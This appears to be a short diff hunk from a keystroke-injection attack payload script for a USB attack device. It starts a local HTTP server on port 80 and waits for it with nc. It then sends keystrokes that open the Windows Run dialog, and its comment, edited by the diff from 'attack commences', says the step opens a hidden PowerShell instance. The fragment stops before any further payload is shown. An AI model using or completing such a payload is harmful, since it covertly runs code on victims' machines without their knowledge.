@@ -25,7 +25,7 @@ python -m SimpleHTTPServer 80 &
 # wait until port is listening
 while ! nc -z localhost 80; do sleep 0.2; done
 
-# attack commences
+#Opens hidden powershell instance
 Q DELAY 1500
 Q GUI r
 Q DELAY 500
